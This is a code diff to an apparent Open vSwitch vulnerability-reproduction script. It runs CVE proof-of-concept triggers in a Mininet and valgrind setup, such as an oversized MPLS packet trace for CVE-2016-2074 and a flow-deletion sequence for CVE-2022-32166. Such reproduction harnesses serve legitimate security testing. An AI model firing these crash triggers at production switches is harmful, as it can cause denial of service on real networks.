@@ -1,12 +1,11 @@
 import os
-import ovs_valgrind
+import ovs_config
 from mininet.log import setLogLevel
 from time import sleep
 from mininet_setup import MininetNetwork
 
 def cve_2016_2074():
     os.system('sudo ovs-vsctl add-br br0')
-
     os.system('ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)')
 
     os.system('sudo ovs-vsctl del-br br0')
@@ -16,7 +15,7 @@ def cve_2016_10377():
     setLogLevel('info')
     os.system('gcc packets/cve_2016_10377.c -o packets/cve_2016_10377')
 
-    ovs_valgrind.start_valgrind('cve_2016_10377')
+    ovs_config.start_valgrind('cve_2016_10377')
     
     mininet = MininetNetwork()
     mininet.mininet_2h_1s()
@@ -30,7 +29,7 @@ def cve_2016_10377():
     mininet.stop_mininet()
     mininet.cleanup_network()
 
-    ovs_valgrind.valgrind_cleanup()
+    ovs_config.valgrind_cleanup()
 
     os.system('rm packets/cve_2016_10377')
 
@@ -53,11 +52,17 @@ def cve_2022_4338():
     pass
 
 def cve_2022_32166():
-    pass
+    os.system('ovs-vsctl add-br br-int')
+    os.system('ovs-ofctl add-flow br-int "table=0,cookie=0x1234,priority=10000,icmp,actions=drop"')
+    os.system('ovs-ofctl --strict del-flows br-int "table=0,cookie=0x1234/-1,priority=10000"')
+
+    os.system('ovs-vsctl del-br br-int')
 
 def cve_2023_1668():
     pass
 
+# This is for testing purposes:
 if __name__ == '__main__':
     #cve_2016_2074()
     cve_2016_10377()
+    #cve_2022_32166()  
